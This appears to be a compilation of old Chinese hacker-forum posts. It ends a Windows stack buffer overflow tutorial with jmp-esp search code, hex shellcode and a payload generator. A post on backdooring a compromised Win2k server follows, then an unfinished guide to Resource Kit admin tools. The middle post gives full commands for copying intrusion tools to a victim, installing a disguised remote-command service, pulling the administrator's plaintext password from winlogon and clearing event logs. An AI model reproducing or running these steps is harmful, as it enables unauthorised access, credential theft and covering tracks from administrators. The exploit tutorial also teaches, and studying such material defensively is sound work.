if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
{
// TODO: change error code to suit your needs
cerr << _T("Fatal Error: MFC initialization failed") << endl;
nRetCode = 1;
}
else
{
return 0;
__asm jmp esp
}
return nRetCode;
}
好了，然后在Visual C++环境中设置正确的调试断点。哪里？对了，在“return
0;”处。接着运行程序，使其在断点处暂停运行。现在（选择“view”菜单――“Debu
g
Windows”――“Disassembly”）打开反汇编窗口，并在反汇编窗口中单击鼠标右键，
在右键弹出菜单中选择“Source
Annotation”和“Code Bytes”。此时，在内存地址列右侧、(jmp esp)指令列左侧的"
FF E4"就是指令"jmp
esp"的机器码。如果需要找出其它汇编指令的机器码，基本上都可通过这种方法得到。

下一步是如何在我们的进程空间里找到这串机器码。也是非常简单的，只要修改一下代
码即可：
CWinApp theApp;
using namespace std;
int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
int nRetCode = 0;
// initialize MFC and print and error on failure
if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
{
// TODO: change error code to suit your needs
cerr << _T("Fatal Error: MFC initialization failed") << endl;
nRetCode = 1;
}
else
{
#if 0
return 0;
__asm jmp esp
#else
bool we_loaded_it = false;
HINSTANCE h;
TCHAR dllname[] = _T("User32");
h = GetModuleHandle(dllname);
if(h == NULL)
{
h = LoadLibrary(dllname);
if(h == NULL)
{
cout<<"ERROR LOADING DLL: "< return 1;
}
we_loaded_it = true;
}
BYTE* ptr = (BYTE*)h;
bool done = false;
for(int y = 0;!done;y++)
{
try
{
if(ptr[y] == 0xFF && ptr[y+1] == 0xE4)
{
int pos = (int)ptr + y;
cout<<"OPCODE found at 0x"< }
}
catch(...)
{
cout<<"END OF "< done = true;
}
}
if(we_loaded_it) FreeLibrary(h);
#endif
}
return nRetCode;
}
也许你会奇怪，为什么不用Kernel32.dll呢？它不是更通用吗？我刚开始时也是在动态
链接库Kernel32的进程空间寻找”FF
E4”，但居然一处也找不到！（而在Windows NT
4中找到能至少6处！：（（）后来我尝试在User32.dll中寻找，终于找到了一处。运行
后程序输出：
OPCODE found at 0x77e2e32a
END OF User32 MEMORY REACHED
注意，不同的动态链接库和版本，得到的结果可能会不一样。我的动态链接库User32.d
ll版本为5.00.2180.1。现在用16进制文件编辑器（如Ultra
Edit）打开overflow.txt文本文件，在第21字符位置开始输入2A E3 E2 77。（为什么要
在第21字符位置？为什么要输入2A E3
E2
77？我不想解释了，如果你连这都看不懂，建议你不要再研究缓冲区溢出了！）我们先
保留后面的四个’a’字符。使用调试器运行程序，执行到”ret”命令处停下来，看看
下一条指令是否为”jmp
esp”，而且执行”jmp esp”前esp的内容是否为0x61616161。如果一切正确，OK, so
far so good.
；）让我们来进行更刺激的事情DD编写缓冲区溢出后的执行代码。
首先，你必须确保所有需要的动态链接库都被加载到进程空间中。一种方法是利用该程
序本身调用的动态链接库；另一种方法是在溢出代码中加载该动态链接库。（在ipxodi
的《Windows系统下的堆栈溢出?分 有详细介绍。）在这里我采用第一种方法。为什么?
 因为简单嘛。；?P>呵呵，为了编程简单，同时本文的主要目的是教学，重点在于原理
，所以代码执行时仅是弹出一个消息框。如果想编写更具攻击性或更复杂的执行代码，
可参阅ipxodi所著的《Windows系统下的堆栈溢出》? 绿色兵团整理的《高级缓冲区溢?
觥贰２还 ，后果自负?P>首先我们要找到如何在代码中调用MessageBox函数。根据Win
dows
API文档，MessageBox依赖于user32.lib，也就是说它位于user32.dll动态链接库中。启
动depends工具，打开将要被溢出的应用程序，可以发现它将加载user32.dll。然后寻找
MessageBox函数的内存位置。
在我机器的user32.dll中，MessageBoxA（ASCII版本）函数的偏移量（Entry
Point）为0x00033D68。User32.dll在内存中的起始地址为0x77DF0000。将两者相加即可
得到MessageBox函数的绝对内存地址为0x77E23D68。所以我们需要在汇编代码中正确设
置堆栈并调用0x77E23D68。根?荻Steve
Fewer的winamp缓冲区溢出代码学习和研究，我写出来的汇编代码如下：
push ebp
push ecx
mov ebp,esp
sub esp,54h
xor ecx,ecx
mov byte ptr [ebp-14h],'S'
mov byte ptr [ebp-13h],'u'
mov byte ptr [ebp-12h],'c'
mov byte ptr [ebp-11h],'c'
mov byte ptr [ebp-10h],'e'
mov byte ptr [ebp-0Fh],'s'
mov byte ptr [ebp-0Eh],'s'
mov byte ptr [ebp-0Dh],cl
mov byte ptr [ebp-0Ch],'W'
mov byte ptr [ebp-0Bh],'e'
mov byte ptr [ebp-0Ah],' '
mov byte ptr [ebp-9],'G'
mov byte ptr [ebp-8],'o'
mov byte ptr [ebp-7],'t'
mov byte ptr [ebp-6],' '
mov byte ptr [ebp-5],'I'
mov byte ptr [ebp-4],'t'
mov byte ptr [ebp-3],'!'
mov byte ptr [ebp-2],cl
push ecx
lea eax,[ebp-14h]
push eax
lea eax,[ebp-0Ch]
push eax
push ecx
mov dword ptr [ebp-18h],0x 77E23D68
call dword ptr[ebp-18h]
mov esp,ebp
pop ecx
pop ebp
以上汇编代码将调用位于0x77E23D68的MessageBox函数，使其弹出标题为”Success”、
消息内容为”We Got
It!”的消息框。必须要注意的是，我们不能使用0（NULL）作为字符串中的字符，解决
方法请参考ipxodi所著的《Windows系统下的堆栈溢出》和绿色兵团整理的《高级缓冲区
溢出》。现在，我们要得到这? 汇编代码的机器码。方法前面已经介绍过了，不再重复?
 最后整理得到的机器码为?P>\x55\x51\x8b\xec\x83\xec\x54\x33\xc9\xc6\x45\xec\
x53\xc6\x45\xed\x75\xc6\x45
\xee\x63\xc6\x45\xef\x63\xc6\x45\xf0\x65\xc6\x45\xf1\x73\xc6\x45\xf2\x73\x88
\x4d
\xf3\xc6\x45\xf4\x57\xc6\x45\xf5\x65\xc6\x45\xf6\x20\xc6\x45\xf7\x47\xc6\x45
\xf8
\x6f\xc6\x45\xf9\x74\xc6\x45\xfa\x20\xc6\x45\xfb\x49\xc6\x45\xfc\x74\xc6\x45
\xfd
\x21\x88\x4d\xfe\x51\x8d\x45\xec\x50\x8d\x45\xf4\x50\x51\xc7\x45\xe8\x68\x3d

\xe2\x77\xff\x55\xe8\x8b\xe5\x59\x5d
如果现在将这输入到overflow.txt文件中，将能够成功溢出，并弹出我们定制的消息框
。但当单击”确定”按钮后，应用程序将崩溃。要避免出现这种情况，我们需要调用ex
it函数以正常关闭程序。查阅Wi
ndows
API文档可知，需要导入msvcrt.lib，因此肯定在msvcrt.dll动态链接库中。使用depen
ds工具会发现应用程序加载了msvcrtd.dll而不是msvcrt.dll，这是因为我们应用程序现
在使用的是调试版本。但两者? 太多区别。Msvcrtd.dll在内存中的起始地址为0x10200
000，exit函数的偏移量（Entry
Point）为0x0000AF90，则exit函数的绝对地址为0x1020AF90。故汇编代码为：
push ebp
push ecx
mov ebp,esp
sub esp,10h
xor ecx,ecx
push ecx
mov dword ptr [ebp-4],0x1020AF90
call dword ptr[ebp-4]
mov esp,ebp
pop ecx
pop ebp
以上代码以0为参数调用exit函数，使应用程序以代码0退出运行。整理后得到的机器码
如下：
\x55\x51\x8b\xec\x83\xec\x10\x33\xc9\x51\xc7\x45\xfc\x90\xaf\x20\x10\xff\x55
\xfc\x8b\xe5\x59\x5d
现在将上面两串机器码输入到overflow.txt文件中（以第25个字节为起始位置。这次不
用问为什么了吧？！如果还不懂，复习一下前面的内容!）
如果你嫌麻烦，可以使用以下程序（怎么样，够朋友了吧？；））：
CWinApp theApp;
using namespace std;
int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
int nRetCode = 0;
// initialize MFC and print and error on failure
if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
{
cerr << _T("Fatal Error: MFC initialization failed") << endl;
nRetCode = 1;
}
else
{
char buffer[20];
//0x77e2e32a //user32.dll JMP ESP
char eip[] = "\x2a\xe3\xe2\x77";
char sploit[] =
"\x55\x51\x8b\xec\x83\xec\x54\x33\xc9\xc6\x45\xec\x53\xc6\x45\xed\x75\xc6\x4
5\xee"
"\x63\xc6\x45\xef\x63\xc6\x45\xf0\x65\xc6\x45\xf1\x73\xc6\x45\xf2\x73\x88\x4
d\xf3\xc6"
"\x45\xf4\x57\xc6\x45\xf5\x65\xc6\x45\xf6\x20\xc6\x45\xf7\x47\xc6\x45\xf8\x6
f\xc6\x45"
"\xf9\x74\xc6\x45\xfa\x20\xc6\x45\xfb\x49\xc6\x45\xfc\x74\xc6\x45\xfd\x21\x8
8\x4d\xfe"
"\x51\x8d\x45\xec\x50\x8d\x45\xf4\x50\x51\xc7\x45\xe8\x68\x3d\xe2\x77\xff\x5
5\xe8\x8b"
"\xe5\x59\x5d\x55\x51\x8b\xec\x83\xec\x10\x33\xc9\x51\xc7\x45\xfc\x90\xaf\x2
0\x10\xff"
"\x55\xfc\x8b\xe5\x59\x5d";
for(int x=0;x<20;x++)
{
buffer[x] = 0x90;
}
CFile file;
file.Open("overflow.txt",CFile::modeCreate | CFile::modeWrite);
file.Write(buffer,20);
file.Write(eip,strlen(eip));
file.Write(sploit,strlen(sploit));
file.Close();
}
return nRetCode;
}
在确保所有文件的内容和位置都准确无误后，运行被溢出程序…………哈哈，我们的消
息框弹出来了！！！单击”确定”按钮，程序正常关闭！！！
--[ 后记
最近访问国外的安全站点、黑客站点，发现国外越来越多地关注Windows系统的安全，研
究Windows系统漏洞的也越来越多，包括L0pht、Cerberus等。特别是在一些黑客性质很
重的站点，针对Windows
9x/NT/2k的攻击程序一堆堆的。真的有点不敢想像，如果Micro$oft公开所有Windows的
源代码，会有多少安全漏洞被发现。而我想，根据国内使用Windows平台的普遍性，问题
将会更加严重。因此我觉得国?诙Windows的安全性研究应该抓得更紧些！虽然实际情况
令人沮丧……：（
这篇文章本来不打算整理的，因为我自己也是刚开始研究Windows系统下的缓冲区溢出，
掌握的东西不多，担心被Windows高手取笑。后来倒是自己想通了：只有“班门弄斧”，
才能知道自己的不足，才能更快地取得进步。希望众Windows高手、黑客高手多多指教。
象我们绿色兵团里的ipxodi、袁哥、zer9等，都是Windows平台下的安全专家，如果本文
能起到“抛砖引玉”的作用，我便很满足了。：）


-- 

--
※ 来源:・北大未名站 bbs.pku.edu.cn・[FROM: 202.113.24.109]
--------------------------------------------------------------------------------
.. 返回


【Win2k入侵后后门的放置】
转]Win2k入侵后后门的放置 
    在阅读本文之前，假设你已经成功入侵了某台Win2k主机并取得了管理员帐号。大多数时候我们入侵某台主机的目的并不是为了直接破坏，可以在该主机上留下后门以便自己以后可以方便的“使用”该机。
    目前一般情况下，入侵Win2k后使用最多的后门是RemoteNc了，但该工具有一很大的缺点，容易被杀毒软件查出，而且如果用fport或Active Ports等软件也可以看到它监听的端口，这很容易让管理员发现。
对于Win2k下的后门推荐使用Win2k Resoruce Kit中自带的一个小工具
rcmdsvc.exe和rcmd.exe，这是微软自己出的一个用来在命令行下远程
管理主机的小工具。它有以下优点：

1、不会被杀毒软件认为是病毒或后门程序，毕竟这是微软自己出的东西。
2、非常隐蔽，它开的端口是445，和Win2k系统的Microsoft-DS服务开的
端口一样，用fport或Active Ports都不能列出它正在监听的端口。

下面我们来看一次实际的操作

当然进行以下操作之前假设已经具有以下条件：

1、你已经取得了xxx.xxx.xxx.xxx的管理员权限
2、该机启用了tcp/ip上的Netbios支持
3、在IP安全策略中对139和445端口未进行屏蔽
4、安全策略中对匿名连接的额外限制采用的是默认的安全选项

/*如果后三条中有某条不能满足，那么会让我们的后续操作有些困难，
不过仍然有其它办法可以继续，如果大家感兴趣我会在以后的文章中说明*/

c:\>net use z: \\xxx.xxx.xxx.xxx "password" /user:"administrator"

c:\>copy rcmdsvc.exe z:\winnt\system32
c:\>copy pulist.exe z:\winnt\system32
c:\>copy findpass.exe z:\winnt\system32
c:\>copy kill.exe z:\winnt\system32
c:\>copy clearel.exe z:\winnt\system32
c:\>copy clealog.cmd z:\winnt\system32
c:\>copy fpipe.exe z:\winnt\system32
c:\>copy msvcp60.dll z:\winnt\system32

/*拷贝一些常用的工具到对方服务器上，在这里对这些工具做一个简要说明：
rcmdsvc.exe Win2k Resource Kit中的远程命令行服务器端程序
pulist.exe 可以列出系统进程和该进程所属用户的工具
findpass.exe 可以在winlogon.exe进程中查找指定用户名的名文口令的工具
kill.exe 可以用pdi或进程名杀掉指定进程的工具
clearel.exe 清除系统、应用程序、安全日志的工具
clealog.cmd 同上
fpipe.exe 可以在命令行下做端口重定向的工具
msvcp60.dll vc的运行库，这个东西其实不是必须的，但为了防止在某些缺少
msvcp60.dll的机上在运行clealog清除日志时对方的机上会突然弹出一个对话
框说缺少msvcp60.dll的尴尬
情况，最好把它一起复制过去。*/

c:\>sc \\xxx.xxx.xxx.xxx create "Remote Command Service" binpath= 
c:\winnt\system32\rcmdsvc.exe type= own start= auto

/*在这里我们用sc在目标机xxx.xxx.xxx.xxx上创建了一个名为Remote Command 
Service的服务，启动方式为自动。当然为了隐蔽，你最好把“Remote Command 
Service”这个服务名改成其它比较类似系统服务的名字，毕竟管理员不可能
看着一个突然多出来的Remote Command而坐视不管，而且也显的你太嚣张了。*/

/*ps:sc.exe是Win2k Resource Kit中一个功能非常强大的对服务进行控制的工具，
详细的使用方法可以参考本站的《sc使用完全指南》。*/

c:\>sc \\xxx.xxx.xxx.xxx start "Remote Command Service"

SERVICE_NAME: rpc support services
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE,NOT_PAUSABLE,
IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0

/*在这里我们用sc启动刚才创建的Remote Command Service服务。*/ 

/*下面连上对方服务器*/

c:\>rcmd

Enter Server Name : xxx.xxx.xxx.xxx
Connect to \\xxx.xxx.xxx.xxx

Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-1999 Microsoft Corp.

C:\document. and Settings\Default User.WINNT>pulist

Process           PID  User
Idle              0
System            8
smss.exe          168  NT AUTHORITY\SYSTEM
csrss.exe         192  NT AUTHORITY\SYSTEM
winlogon.exe      212  NT AUTHORITY\SYSTEM
services.exe      240  NT AUTHORITY\SYSTEM
lsass.exe         252  NT AUTHORITY\SYSTEM
svchost.exe       408  NT AUTHORITY\SYSTEM
spoolsv.exe       436  NT AUTHORITY\SYSTEM
msdtc.exe         464  NT AUTHORITY\SYSTEM
svchost.exe       596  NT AUTHORITY\SYSTEM
llssrv.exe        624  NT AUTHORITY\SYSTEM
regsvc.exe        676  NT AUTHORITY\SYSTEM
rpcsvc.exe        692  NT AUTHORITY\SYSTEM
mstask.exe        716  NT AUTHORITY\SYSTEM
LSESS.EXE         792  NT AUTHORITY\SYSTEM
tlntsvr.exe       832  NT AUTHORITY\SYSTEM
VrUpSvr.exe       956  NT AUTHORITY\SYSTEM
winmgmt.exe       968  NT AUTHORITY\SYSTEM
dns.exe           980  NT AUTHORITY\SYSTEM
dfssvc.exe        1064 NT AUTHORITY\SYSTEM
POP3S.exe         1100 NT AUTHORITY\SYSTEM
smtpds.exe        1120 NT AUTHORITY\SYSTEM
svchost.exe       1384 NT AUTHORITY\SYSTEM
dllhost.exe       1316 NT AUTHORITY\SYSTEM
internat.exe      1308 SERVER\Administrator
conime.exe        1680 SERVER\Administrator
VRMONSVC.EXE      872  NT AUTHORITY\SYSTEM
inetinfo.exe      1456 NT AUTHORITY\SYSTEM
explorer.exe      1548 SERVER\Administrator
cmd.exe           1712 SERVER\Guest
pulist.exe        532  SERVER\Guest

/*我们可以看到winlogon.exe的进程号是212*/

C:\document. and Settings\Default User.WINNT>findpass server 
administrator 212

To Find Password in the Winlogon process
Usage: fidp DomainName UserName PID-of-WinLogon

The debug privilege has been added to PasswordReminder.
The WinLogon process id is 214 (0x000000d6).
To find server\administrator password in process 214 ...
The encoded password is found at 0x01a00800 and has a length of 3.
The logon information is: server/administrator/Tgrh87fd.
The hash byte is: 0xb8.

/*在winlogon中查找administrator的名文口令*/

C:\document. and Settings\Default User.WINNT>clealog
clealog done

/*清除日志记录*/

C:\document. and Settings\Default User.WINNT>

到这里我们已经看到administrator的密码是Tgrh87fd

至此我们拿到了管理员的密码并安放了一个rcmdsvc的后门，当然你还可以接着做许多事。比如利用Adam发现的Bug再克隆一个管理员账号。或者用sc把对方的Tlntsvr服务启起来。不过后者比较容易被发现，不推荐。如果你对他的内网的某台机感兴趣而且该机也有漏洞，可以用fpipe做端口重定向后为下一步的进攻做准备。
 


【Windows 2000 Resource Kit工具使用说明】
Windows 2000 Resource Kit工具使用说明（中文）

Resource Kit 第一部分 （1～23） 


作者：无痕

概要 

Resource Kit实际上是Microsoft为管理员提供的一套额外的工具集，包括了超过400个各种工具，vbs，dll，msc，涵盖了管理TCP/IP，网络，注册表，安全，远程管理，配置，Batch文件，以及操作系统的其他方面。可以让你更容易的管理一个NT系统。不得不承认这是一个非常庞大的工具集，包括到了已经被人们所遗忘2K所应该具有的功能。当你了解到了里面一些工具的性能以后，你将会知道即使仅仅只是一个C2级的操作系统也具有相当的安全性，对于细心配置的系统，攻击也只能伤其表面。但是，但是任何东西都有他的两面性，ResKit就非常具有代表性，在Hacker群体中大家习惯把这个玩意叫做“Hacker的工具箱”。当然如果你想当一个Hacker你得掌握里面的东西，而想当一个好的administrator你也得掌握里面的东西。希望大家都可以好好看看。
这个介绍的内容将会尽量多的写，但是个人能力有限，有什么问题大家赶快提出来进行改正和充实。 

第一部分：管理你的计算机 

1. Appsec.exe （Application Security） 

Appsec.exe是一个基于GUI的应用程序，它允许管理员在一个多用户环境下限制普通用户访问一组网络上经预订 

的应用程序。启用这种应用程序安全性，将会导致系统拒绝普通用户执行或使用一个未经许可的应用程序。大家 

看这是不是一个很有用的工具呢？对某些特定的程序进行限制以后，可以减少一些Hacker入侵的可能，下面我们 

继续讨论。 

对于2000来说一个显著的特点就是引入了GPO（Group Policy）这种东西，实际上就是一个界面化了的注册表 

编辑器，但是因为GPO的存在2000大大提高了他的安全性。一般来说，我们可以通过配置GPO从启动菜单和桌面 

上隐藏一个应用程序，但是不能禁止用户用其它手段访问它，Appsec增加了这种安全性，可以禁止用户执行应用 

程序甚至是从命令行模式或者使用其他的应用程序。Microsoft的建议是和GPO一起使用，放在Terminal 

Server上运行或者说是在应用程序运行的机器上使用。 

Appsec对于应用程序的限制还算严格，除了应用程序的名称以外还要包括该应用程序的全路径，只有二者都附和 

才能够运行。 

下面提几点注意： 

a. 只有管理员或管理员组的成员可以运行所有程序，用户（包括PowerUser组）只能运行列表中的应用程序。 

b. Appsec第一次启用时，Terminal Server的会话必须中断，否则Appsec将不能在本次会话中启用。 

c. 实际上Appsec只能限制调用CreateProcess方法的应用程序，不能限制使用NTCreateProcess方法的程序 

，但是这种程序非常的少见。 

d. Appsec只能限制32位的程序，但是在默认情况下，一旦启用appsec任何对16位程序的访问都是禁止的，但 

是可以添加ntvdm.exe来使16位程序可以被访问。 

e. 我想这个也是Appsec最大的缺点，Appsec并不对程序本身进行检查，也就是所如果将该有效程序进行替换 

的话，Appsec不会发现。所以说我们必须禁止用户替换和重命名应用程序，这可以用Security Template来做 

。 

f. 还有Appsec只可限制可执行文件，不可以是DLLs。 

g. Appsec的使用是对于计算机的，也就是说一经启用使用本机的用户都要受到限制。 

另外，应该要提到的一点是，按照Microsoft的要求，Appsec的列表中至少应该有： 
\Wtsrv\explorer.exe 
\Wtsrv\system32\cmd.exe 
\Wtsrv\system32\net.exe 
\Wtsrv\system32\regini.exe 
\Wtsrv\system32\subst.exe 
\Wtsrv\system32\systray.exe 
\Wtsrv\system32\xcopy.exe 
这么几项。 

当然啦！你去掉也是可以的，但是会造成用户难以正常使用。嗯，以我个人的建议，如果你想防止Hacker入侵去 

掉net.exe会有意想不到的收获，呵呵！cmd.exe也是不错的选择，如果不想管理员以外的任何人访问就统统去 

掉就好，后果你们试试就知道了。 

p.s. 这个程序所需要的文件Appsec.exe（这个倒是在），Appsec.hlp（这个也在），但是Appsec.dll， 

psec.cnt，Instappsec.exe并没有包括在Resource Kit里面，要去网站上自己下载！！这简直是搞笑嘛！也 

只有Microsoft干得出来。你可以在这个地方下载这个hotfix: 
http://download.microsoft.com/download/win2000platform/Appsec/1.0/NT5/EN-US/appsec_hot 

fix.exe，安装以后就可以用了。 
启用以后，换个用户（不是管理员组）登陆本机随便点个应用程序，你就可以看到Access to specified 

device, path or file is denied的警告，很厉害的，哈哈！ 

2. Cachemov.exe (Offline Files Cache Mover) 

Cachemov.exe一个有趣的东东，用来移动离线文件的缓存（默认保存在根卷下），如果你觉得那东西在那个地 

方碍的你事的话，把它挪个地方也没有什么问题。这个工具比较简单就不再多说什么了，就一个GUI，然后选择 

一个卷，它就自动帮你做完了，很简单。你也可以使用无人值守模式 cachemov -unattend x:\ 电脑自己搞 

定，此时需要(Cchmvmsg.dll)。所有的结果会保存至应用程序日志。 

只是注意一下，运行时需要管理员的身份，还有就是不能够移动到网络驱动器和可移动驱动器上去。移动以后不 

要改letter，不然你会有麻烦的！ 

3. Defptr.exe （Default Printer） 

如果你闲着没有事的话，可以用用这个东西。它允许你随意改变你的默认打印机，可以在可用的网络和本地打印 

机间交换，一旦运行以后会在右下角有个小图标（如果不想看到图标可以使用defptr -i), 这个东西可能对漫 

游用户会有一点好处吧！ 

4. Delprof.exe（User Profile Deletion Utility） 

删除用户的Profile时用的工具，本来这个是可以在System Properties里面做的。而这个工具可以在本地或 

是远程运行，看起来的好处就是可以指定多长时间不使用就删除，在处理比较多的用户的时候才显得出好处来， 

就那么个把的话，就自己做好了。稍微介绍一下语法好了。 

delprof /q /i /p /c:\\computername /days /? 

/q 后台悄悄执行，不用确认。 
/i 忽略错误继续删除。 
/p 在删除前提示确认。 
/c:\\computername 这个不用解释了吧？ 
/days 指定多少天不使用的Profile就删除，days用整数。 
/? 出现上面这些东东。 

5. DelSrv.exe （Delete Service） 

一个拿来删除服务用的工具，使用起来非常简单，只要delsrv servicename就可以了。没有什么好说的。 



（未完待续） 

6. Dureg.exe （Registry Size Estimator） 

这是一个用来评估你的注册表储存了多少数据的工具，可以从任何一个hive，subtree和subkey中读出。另外 

，这个工具还可以用来搜索注册表中的text字符串，这种搜索还可以具体到某个subtree中。 
这个工具主要用于得出注册表具体占用空间，对于开发人员和管理员来说都是一个非常有用的工具。虽然我们可 

以使用控制面板中的System选项和系统监视器中的Registry Quota in Use来监视注册表，但是如果你只想知 

道某个单独的Key或者是Subkey所占用的空间，上面这些工具就无能为力了。 

语法： 

dureg /cr /cu /u /lm /a /s│/d "registry_path" "string to search" 

/a 
表示查找整个注册表的大小。 

dureg /a 
Size of HKEY_CLASSES_ROOT : 7740324 
Size of HKEY_USERS : 995732 
Size of HKEY_LOCAL_MACHINE : 17265663 

Total Registry data size: 26001719 

/cr "registry_path" 
默认情况下，返回的是HKEY_CLASSES_ROOT的大小。 

/cu "registry_path" 
默认情况下，返回的是HKEY_CURRENT_USER的大小。 

/lm "registry_path" 
默认情况下，返回的是HKEY_LOCAL_MACHINE的大小。 

/u "registry_path" 
默认情况下，返回的是HKEY_USERS的大小。 

以上四个选项都可以在 "registry_path"中填入该Subkey下的任意key。比如： 
dureg /lm "software\microsoft",查找HKEY_LOCAL_MACHINE\Software\Microsoft key的大小。 

/s "string" 
在注册表中搜索该字符串。比如： 
dureg /s "run" 寻找和run相关的字符串。当然你也可以和/cr等这几个参数一起使用，比如：dureg /cr 

/s "run"。 
会看到一大串显示，这里就不写出来了。 

7. Elogdmp.exe （Event Log Query Tool） 

一个命令行工具用来导出选定的日志中的信息。这是在屏幕上进行显示，最好和Find或者是Findstr这样的工具 

一起使用，不然太难找到了。 

语法： 

elogdmp -? computername eventlogtype 

eventlogtype有Application, Security，System三种。 

比如： elogdmp hello application 

这个工具可以远程使用，但是需要域管理员组或者是本地管理员组的成员才可以使用。 

8. Instsrv.exe （Service Installer) 

嗯，Instsrv.exe一个命令行工具可以用来安装或者是删除可执行服务（.exe)，当然也可以给它们分配名字的 

。 

语法： 

instsrv Servicename pathtoexecuteable -a accountname -p accountpassword or Servicename 

remove 

ServiceName 
用来显示的名字，比如Alerter。 

PathToExecuteable 
要安装服务文件的全路径，包括盘符在内。 

-a accountname 
指定服务运行的帐户。 

-p accountpassword 
帐户的密码。 

servicename remove 
指定你想移出的服务。 

比如：你想安装一个bbb.exe作为一个bbb的服务。 
instsrv bbb "c:\program files\bbb.exe" 
默认情况下，我们安装的服务是没有启动的，需要启动。而有些时候需要插入相应的注册表项。 

如果想指定这个服务在某个用户下运行： 
instsrv bbb "c:\program files\bbb.exe -a hello\bbb -p xxx" 
that's OK！ 

如果要卸在的话: instsrv bbb Remove，注意删除之前要先Stop。 

这里我们再提到一个工具Srvinstw.exe，这是一个GUI模式的工具，所以用起来非常的简单，照着提示一步步 

做就可以了。它和Instsrv.exe的区别是这个东东可以在远程计算机上安装服务。它们都需要administrator 

的特权，请记住。 

9. intfiltr.exe （Interrupt Filter) 

这是一个在多CPU环境下用来调整CPU之间中断关系的工具，可以用来测试最优化的方案。我没有2个这种东西， 

这个程序就没有进行测试了！那个有的话，帮我试试，告诉我结果。我把它补全。 

10. Inuse.exe （File-In-Use Replace Utility） 

一个命令行工具可以用来替换被锁定的操作系统文件，比如一些重要的DLL文件。这些文件会在下一次启动的时 

候被替换，根据微软的说法，这种替换会在下一次启动的Autochk完成之后，创建Paging Files之前。基本上 

来说，这个一个调试用的工具。该程序需要管理员身份运行。 

语法： 

insuse -? source destinaion /y 

source 
你想用来替换的文件。可以使用完整的物理路径或者是UNC路径。 

destination 
你要替换的文件。 

/y 
表示确定。 

如果你想用一个远程文件来替换一个本地存在的文件可以使用下面的方法。 
inuse \\hello\winnt\abc.dll c:\winnt\abc.dll /y 

11. Javareg.exe （Java/COM Registration Utility） 

命令行工具可以用来注册Java classes，鄙人不懂Java这种高深的东西，连什么是classes都不知道，没有办 

法了，这一块就只好％￥＆………了，不好意思。有懂的人帮一下忙好了，呵呵！！ 

12. Netsvc.exe （Command-line Service Controller） 

一个命令行工具，用来控制服务，和SC比较类似，但是在功能上要比后者少很多！用这个工具基本上可以进行远 

程启动，停止，暂停，继续服务或者查询一个服务的状态。基本上只要你是一个普通用户就可以执行这个命令， 

当然如果要启动和停止的话，就需要相应的权限了。 

当然和SC相比Netsvc有很大的局限性，所以在这里我多说一点和服务有关的东西。 
在Win2k虽然你可以对各种服务进行查询，但是并不是所有的服务都可以直接关闭，比如Workstation这个服务 

，但奇怪的是Workstation这个服务有些时候会莫名其妙的丢失，至今我还不知道原因，一旦丢失以后基本上就 

需要重装了。我们继续话题，当一个用户有许多活动的连接存在的时候，你只可以查询或者是暂停该服务，而不 

能远程强迫服务停止。而如果有服务依靠别的服务才能运行的时候，我们也不能直接停止该服务。举一个简单的 

例子，Clipbook服务需要Network DDE服务才能运行，我们必须先停止CilpBook才能停止Network DDE。 

这里还要提到另外一种状况，就是当你停止一个不可以停止的服务的时候Netsvc会报告Service is running 

，而该服务不能停止的原因有很多种，但是Netsvc并不会报告给你，太惨了！！此外，当一个服务不能被暂停的 

时候，这个鬼东西仍然会报告给你说Service is running，唉！所以说最好使用SC。 

语法： 

netsvc command servicename \\computername /?│/help 

command可以是以下几个命令： 
/list 
列出已经安装的服务，这个时候不使用servicename。 

/query 
查询一个服务的状态。 

/start, /stop, /stop, /continue 
这几个命令就不用解释了吧？字面意义都已经很清楚了。 

最后举两个例子吧！如： 
netsvc /list \\hello 

netsvc /query \\hello "Alerter" 

netsvc Alerter \\hello /pause 

更进一步具体的内容可以在SC那里看到，这里不再多说。 

13. Now.exe 

Reskit里面比较无聊的命令之一，可以在STDOUT（Standard output)上输出一个带时间戳的东东。有点像 

ECHO命令。举例说明算了： 

当我们打入ECHO bbb的时候，屏幕会显示bbb 
C:\>echo bbb 
bbb 

但是当我们用Now bbb的时候，会输出： 
C:\>now bbb 

Sat Feb 16 22:31:34 2002 -- bbb 

这种东西，不知道有什么用，呵呵！ 

14. Pathman.exe 

一个命令行工具可以修改系统路径和用户路径，当然这个工具还可以用来检查路径中的错误，有多余的头部分号 

，尾部分号，多个连接得分号，重复的添加和删除，增加重复的路径或是移出一个不存在的路径等等，但是不检 

查路径的有效性。 

2K保留了两套路径，一个是统一的全局系统路径，另一组是每个用户个别的用户路径，当然为了保证兼容性， 

2000仍然保留了从Autoexec.bat装入路径。每个用户可以修改自己的用户路径，而只有管理员可以修改系统路 

径，为了方便操作，微软就搞出了这个Pathman。 

语法： 

pathman /as /au /rs /ru path 

/as 
增加分号隔开的系统路径。 

/au 
增加分号隔开的用户路径。 

/rs 
删除分号隔开的系统路径。 

/ru 
删除分号隔开的用户路径。 

当修改完成以后，Pathman会广播信息给所有的顶端窗口提醒它们环境被改变了，这将会导致应用程序升级它们 

的环境，获得经修改的路径。 

举例说明： 

添加c:\temp;C:\users\name;d:\utils为用户路径，当然，只是在它们不存在的时侯才添加。这个结果你可 

以在System properties的Environment Variable中看到。上面一栏是user的变量，下面是系统变量。 

实际上这个工具也有个好处就是添加和删除可以同时操作，你可以： 
pathman /au C:\users\name /ru c:\users\name 呵呵！不过没有什么意思！ 

15. Ptree.exe（Process Tree） 

该程序可以允许你在本地或者是远程查询进程树，同样也可以Kill它们。2000默认情况下，允许Local 

Administrators, Power Users, Users查询这些树，但是只有Local Administrators和Power Users可 

以Kill进程。 

就这个工具而言，它有这么几部分组成ptreedrv.sys（kernel-mode驱动程序），ptreesvc.exe和 

ptreesvcps.dll（2000的服务的程序，就是所ptree是需要在该计算机上安装一个服务）， 

Ptreesvr.dll(COM+服务端），ptree.exe（控制台客户端），Ptreeg.exe（GUI客户端，推荐使用这个，在 

